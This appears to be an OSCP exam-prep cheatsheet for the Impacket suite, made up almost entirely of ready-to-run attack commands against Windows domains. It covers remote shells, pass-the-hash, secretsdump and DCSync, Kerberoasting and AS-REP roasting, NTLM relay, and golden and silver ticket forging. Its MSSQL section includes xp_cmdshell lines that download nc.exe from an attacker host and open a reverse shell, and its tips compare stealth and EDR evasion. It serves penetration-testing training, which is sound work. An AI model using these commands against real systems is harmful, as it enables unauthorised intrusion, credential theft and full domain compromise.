# ⚔️ Impacket Cheatsheet — OSCP Reference

> **Quick Reference for Penetration Testing & OSCP Exam**  
> Impacket is a collection of Python scripts for working with network protocols in Windows environments.

---

## 📋 Table of Contents
- [Shell Access & RCE](#-shell-access--rce)
- [Credential Dumping](#-credential-dumping)
- [Kerberos Attacks](#-kerberos-attacks)
- [SMB Operations](#-smb-operations)
- [MSSQL](#-mssql)
- [AD Enumeration](#-ad-enumeration)
- [Network Attacks](#-network-attacks)
- [Ticket Manipulation](#-ticket-manipulation)
- [Common Flags](#-common-flags)
- [Quick Decision Guide](#-quick-decision-guide)

---

## 🖥️ Shell Access & RCE

### PSExec
> Executes commands via SMB — gives **SYSTEM** shell. Creates a service on target.

```bash
# With password
impacket-psexec domain/user:password@192.168.1.1

# Pass the Hash
impacket-psexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain/user@target.domain.local

# Specify command to run
impacket-psexec domain/user:password@192.168.1.1 cmd.exe
```

### SMBExec
> Stealthier than PSExec — no binary upload, uses SMB shares for execution.

```bash
# With password
impacket-smbexec domain/user:password@192.168.1.1

# Pass the Hash
impacket-smbexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# Specify shell
impacket-smbexec domain/user:password@192.168.1.1 -shell-type powershell
```

### WMIExec
> RCE via WMI — no service creation, stealthier for EDR evasion.

```bash
# With password
impacket-wmiexec domain/user:password@192.168.1.1

# Pass the Hash
impacket-wmiexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# Run single command
impacket-wmiexec domain/user:password@192.168.1.1 "whoami"

# With Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k -no-pass domain/user@target.domain.local
```

### ATExec
> RCE via Windows Task Scheduler.

```bash
# With password
impacket-atexec domain/user:password@192.168.1.1 "whoami"

# Pass the Hash
impacket-atexec domain/user@192.168.1.1 -hashes :NTLM_HASH "whoami"
```

### DCOMExec
> RCE via DCOM — alternative execution method.

```bash
# With password
impacket-dcomexec domain/user:password@192.168.1.1

# Pass the Hash
impacket-dcomexec domain/user@192.168.1.1 -hashes :NTLM_HASH

# Specify object
impacket-dcomexec domain/user:password@192.168.1.1 -object MMC20
```

> 💡 **Tip:** PSExec = SYSTEM but noisy. WMIExec = user-level but stealthier. Try WMIExec first, PSExec if it fails.

---

## 🗝️ Credential Dumping

### SecretsDump
> The most versatile dumping tool — SAM, LSA, NTDS, cached creds.

```bash
# Dump everything remotely (SAM + LSA + cached)
impacket-secretsdump domain/user:password@192.168.1.1

# Pass the Hash
impacket-secretsdump domain/user@192.168.1.1 -hashes :NTLM_HASH

# DCSync — dump all domain hashes (run against DC)
impacket-secretsdump domain/user:password@192.168.1.1 -just-dc

# DCSync — dump specific user only
impacket-secretsdump domain/user:password@192.168.1.1 -just-dc-user administrator
impacket-secretsdump domain/user:password@192.168.1.1 -just-dc-user krbtgt

# Dump from local files (offline analysis)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-secretsdump -k -no-pass domain/user@dc01.domain.local -just-dc
```

> 💡 **Tip:** `-just-dc` on the DC = all domain hashes. Use this once you have DA or SYSTEM on the DC.

---

## 🎫 Kerberos Attacks

### GetTGT — Request Ticket Granting Ticket
```bash
# With password
impacket-getTGT domain/user:password

# With NTLM hash (Overpass-the-Hash)
impacket-getTGT domain/user -hashes :NTLM_HASH

# With AES key
impacket-getTGT domain/user -aesKey <AES_KEY>

# Use the ticket
export KRB5CCNAME=user.ccache
```

### GetST — Request Service Ticket
```bash
# Request service ticket
impacket-getST domain/user:password -spn cifs/target.domain.local

# S4U2Self + S4U2Proxy (Constrained Delegation abuse)
impacket-getST domain/user:password -spn cifs/dc01.domain.local -impersonate administrator

# With hash
impacket-getST domain/user -hashes :NTLM_HASH -spn cifs/target.domain.local -impersonate administrator

# Use the ticket after
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.domain.local
```

### ASREPRoast — Find Users Without PreAuth
```bash
# With valid creds (finds all vulnerable users)
impacket-GetNPUsers domain/user:password -dc-ip 192.168.1.1 -request

# Without creds (needs username list)
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip 192.168.1.1

# Save hashes to file
impacket-GetNPUsers domain/user:password -dc-ip 192.168.1.1 -request -outputfile asrep_hashes.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting — Find & Crack SPNs
```bash
# With creds
impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.1 -request

# Save hashes to file
impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.1 -request -outputfile kerb_hashes.txt

# With hash
impacket-GetUserSPNs domain/user -hashes :NTLM_HASH -dc-ip 192.168.1.1 -request

# Crack with hashcat (mode 13100)
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 📂 SMB Operations

### SMBClient
> Browse and interact with SMB shares.

```bash
# Connect with password
impacket-smbclient domain/user:password@192.168.1.1

# Connect with hash
impacket-smbclient domain/user@192.168.1.1 -hashes :NTLM_HASH

# Connect with Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
impacket-smbclient -k -no-pass domain/user@target.domain.local
```

**Inside SMBClient:**
```
shares              # list all shares
use C$              # connect to share
ls                  # list files
cd path\to\dir      # change directory
get filename.txt    # download file
put filename.txt    # upload file
pwd                 # current directory
exit                # quit
```

### SMBServer
> Host your own SMB share on Kali for file transfers.

```bash
# Basic (unauthenticated — may be blocked by policy)
impacket-smbserver share . -smb2support

# With credentials (bypasses guest restriction policy)
impacket-smbserver share . -smb2support -user kali -password kali
```

**Connect from target:**
```powershell
# With creds
net use \\192.168.49.68\share kali /user:kali
copy file.txt \\192.168.49.68\share\file.txt
```

---

## 🗄️ MSSQL

### MSSQLClient
> Interactive MSSQL client with built-in xp_cmdshell support.

```bash
# With password
impacket-mssqlclient domain/user:password@192.168.1.1

# With hash
impacket-mssqlclient domain/user@192.168.1.1 -hashes :NTLM_HASH -windows-auth

# With Windows auth explicitly
impacket-mssqlclient domain/user:password@192.168.1.1 -windows-auth
```

**Inside MSSQLClient:**
```sql
-- Check version
SQL> SELECT @@version;

-- Enable xp_cmdshell
SQL> enable_xp_cmdshell

-- Execute OS commands
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -c iwr http://192.168.49.68/nc.exe -OutFile C:\Windows\Temp\nc.exe"
SQL> xp_cmdshell "C:\Windows\Temp\nc.exe 192.168.49.68 9001 -e cmd.exe"

-- List databases
SQL> SELECT name FROM master..sysdatabases;

-- Use database
SQL> USE database_name;

-- List tables
SQL> SELECT table_name FROM information_schema.tables;

-- Dump table
SQL> SELECT * FROM table_name;
```

---

## 🔎 AD Enumeration

```bash
# Enumerate all domain users
impacket-GetADUsers domain/user:password -all -dc-ip 192.168.1.1

# With hash
impacket-GetADUsers domain/user -hashes :NTLM_HASH -all -dc-ip 192.168.1.1

# LDAP domain dump (creates HTML/JSON/Grep files)
impacket-ldapdomaindump domain/user:password -n 192.168.1.1

# Output to specific directory
impacket-ldapdomaindump domain/user:password -n 192.168.1.1 -o /tmp/ldap_dump
```

> 💡 **Tip:** `ldapdomaindump` creates nice HTML files — open in browser for easy viewing of users, groups, computers, GPOs.

---

## 🌐 Network Attacks

### NTLM Relay
> Relay captured NTLM hashes to authenticate elsewhere. Requires SMB signing disabled on target.

```bash
# Basic relay to targets list
impacket-ntlmrelayx -tf targets.txt -smb2support

# Get interactive SMB shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Execute command on relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP (for AD attacks)
impacket-ntlmrelayx -tf targets.txt -smb2support -t ldap://192.168.1.1

# Relay and dump secrets
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-lm
```

**Pair with Responder to capture hashes:**
```bash
# Run Responder to capture (disable SMB and HTTP in Responder.conf first)
sudo responder -I tun0 -wrf

# Relay with ntlmrelayx simultaneously
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## 🎟️ Ticket Manipulation

### Golden Ticket Attack
```bash
# Create golden ticket (needs krbtgt hash and domain SID)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.local administrator

# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.domain.local
```

### Silver Ticket Attack
```bash
# Create silver ticket (for specific service)
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn cifs/target.domain.local administrator

# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-smbclient -k -no-pass administrator@target.domain.local
```

### Convert Tickets
```bash
# ccache to kirbi (for Rubeus on Windows)
impacket-ticketConverter ticket.ccache ticket.kirbi

# kirbi to ccache (from Windows to Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache
```

---

## 🏴 Common Flags

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | Pass the Hash (use `:NTLM` if no LM hash) |
| `-k -no-pass` | Use Kerberos ticket from `$KRB5CCNAME` |
| `-dc-ip 192.168.1.1` | Specify Domain Controller IP |
| `-target-ip 192.168.1.1` | Specify target IP separately |
| `-just-dc` | Only dump DC secrets (secretsdump) |
| `-just-dc-user <user>` | Dump specific user only (secretsdump) |
| `-request` | Request and output ticket hash |
| `-windows-auth` | Use Windows authentication (MSSQL) |
| `-outputfile file.txt` | Save output to file |
| `-no-pass` | Don't prompt for password (use with -k) |

---

## 🗺️ Quick Decision Guide

| Situation | Tool & Command |
|-----------|---------------|
| Have creds, need SYSTEM shell | `impacket-psexec domain/user:pass@ip` |
| Have hash, need shell | `impacket-psexec domain/user@ip -hashes :HASH` |
| Need stealthy shell | `impacket-wmiexec domain/user:pass@ip` |
| Have ticket, need shell | `export KRB5CCNAME=ticket.ccache` + `psexec -k -no-pass` |
| On DC, dump all hashes | `impacket-secretsdump domain/user:pass@ip -just-dc` |
| Dump SAM/LSA remotely | `impacket-secretsdump domain/user:pass@ip` |
| Dump offline from files | `impacket-secretsdump -sam SAM -system SYSTEM local` |
| Find kerberoastable users | `impacket-GetUserSPNs domain/user:pass -dc-ip ip -request` |
| Find ASREProastable users | `impacket-GetNPUsers domain/user:pass -dc-ip ip -request` |
| Browse SMB shares | `impacket-smbclient domain/user:pass@ip` |
| Host files for transfer | `impacket-smbserver share . -smb2support` |
| MSSQL access | `impacket-mssqlclient domain/user:pass@ip -windows-auth` |
| Relay NTLM hashes | `impacket-ntlmrelayx -tf targets.txt -smb2support` |
| Constrained delegation | `impacket-getST -spn cifs/target -impersonate administrator` |
| Create Golden Ticket | `impacket-ticketer -nthash <krbtgt> -domain-sid <sid>` |
| Enumerate AD users | `impacket-GetADUsers domain/user:pass -all -dc-ip ip` |

---

## 🔗 Execution Method Comparison

| Tool | Privilege | Stealth | Detection Risk | Notes |
|------|-----------|---------|----------------|-------|
| PSExec | SYSTEM | Low | High | Creates service + uploads binary |
| SMBExec | SYSTEM | Medium | Medium | No binary upload |
| WMIExec | User | High | Low | No service creation |
| ATExec | User | Medium | Medium | Via Task Scheduler |
| DCOMExec | User | High | Low | Via DCOM |

---

## ⚠️ OSCP Exam Notes

| Tool | Allowed? |
|------|---------|
| Impacket suite | ✅ Yes — fully allowed |
| psexec.py / wmiexec.py | ✅ Yes |
| secretsdump.py | ✅ Yes |
| GetUserSPNs.py | ✅ Yes |
| ntlmrelayx.py | ✅ Yes |
| sqlmap | ❌ No |
| Metasploit (1 machine) | ⚠️ Limited |

> 📖 Always verify with the official [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

## 💡 Pro Tips

- Always try `wmiexec` before `psexec` — less noisy and doesn't create services
- `secretsdump -just-dc` on a DC is the fastest path to owning the whole domain
- When Kerberos attacks fail — check `/etc/krb5.conf` and `/etc/hosts` for correct DC hostname resolution
- `ldapdomaindump` output is easier to read than raw BloodHound JSON when you just need quick AD info
- Chain `GetUserSPNs` → `hashcat` → `secretsdump` for a full domain compromise path
- Use `-hashes :NTLM_HASH` format (colon prefix) when you only have the NT hash, not the full LM:NT

---

*Generated for OSCP PEN-200 exam preparation*
